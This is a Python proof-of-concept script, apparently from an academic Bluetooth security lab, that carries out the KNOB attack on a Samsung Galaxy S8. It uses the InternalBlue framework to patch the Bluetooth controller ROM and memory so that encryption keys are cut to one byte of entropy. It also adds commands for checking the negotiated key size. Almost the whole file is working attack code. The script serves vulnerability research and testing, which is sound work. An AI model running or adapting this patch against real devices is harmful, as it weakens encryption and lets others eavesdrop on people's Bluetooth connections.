#!/usr/bin/python3

# Jiska Classen, Secure Mobile Networking Lab

import sys
import argparse
from argparse import Namespace

import cmd2
from cmd2 import CommandSet
from pwnlib.asm import asm

from internalblue import Address, hci
from internalblue.adbcore import ADBCore
from internalblue.cli import InternalBlueCLI, auto_int
from internalblue.utils import p16, u16

"""
This is a standalone PoC for the KNOB attack on a Samsung Galaxy S8.

Original LMP monitor mode was from Dennis Mantz, and was then modified by Daniele Antonioli for KNOB.
For details see https://github.com/francozappa/knob

This PoC is much shorter since it only modifies global variables for key entropy.

"""

internalblue = ADBCore(serial=True)
internalblue.interface = internalblue.device_list()[0][1]  # just use the first device

# setup sockets
if not internalblue.connect():
    internalblue.logger.critical("No connection to target device.")
    exit(-1)

internalblue.logger.info("Installing patch which ensures that send_LMP_encryption_key_size_req is always len=1!")

# modify function lm_SendLmpEncryptKeySizeReq
patch = asm("mov r2, #0x1", vma=0x530F6)  # connection struct key entropy
internalblue.patchRom(Address(0x530F6), patch)

# modify global variable for own setting
internalblue.writeMem(0x255E8F, b'\x01')  # global key entropy

internalblue.logger.info("-----------------------KNOB-----------------------\n"
                         "Installed KNOB PoC. If connections to other devices succeed, they are vulnerable to KNOB.\n"
                         "To monitor device behavior, continue on the CLI, ideally with diagnostic LMP mode.\n"
                         "On Android, this requires a modified bluetooth.default.so.\n"
                         "-----------------------KNOB-----------------------\n"
                         "Automatically continuing on KNOB interface...\n"
                         "Use the 'knob' command to *debug* the attack, i.e.:\n"
                         "    knob --hnd 0x0c\n"
                         "...shows the key size of handle 0x000c.\n")


class KnobCommands(CommandSet):
    knob_parser = argparse.ArgumentParser()
    knob_parser.add_argument("--hnd", type=auto_int, default=0x000c, help="Handle KNOB connection.")

    @cmd2.with_argparser(knob_parser)
    def work(self, args):
        """Debugs which key length is currently active within a connection handle."""
        internalblue.sendHciCommand(hci.HCI_COMND.Encryption_Key_Size, p16(args.hnd))
        return True


def hciKnobCallback(record):
    """
    Adds a new callback function so that we do not need to call Wireshark.
    """
    hcipkt = record[0]
    if not issubclass(hcipkt.__class__, hci.HCI_Event):
        return

    if hcipkt.event_code == 0x0e:
        if u16(hcipkt.data[1:3]) == 0x1408:  # Read Encryption Key Size
            if hcipkt.data[3] == 0x12:  # Error
                internalblue.logger.info("No key size available.\n"
                                         " - Did you already negotiate an encrypted connection?\n"
                                         " - Did you choose the correct connection handle?\n")
            else:
                internalblue.logger.info("HCI_Read_Encryption_Key_Size result for handle 0x%x: %x" % (u16(hcipkt.data[4:6]), hcipkt.data[6]))

    return


# add our command
internalblue.registerHciCallback(hciKnobCallback)

# enter CLI
cli = InternalBlueCLI(Namespace(data_directory=None, verbose=False, trace=None, save=None), internalblue)
sys.exit(cli.cmdloop())
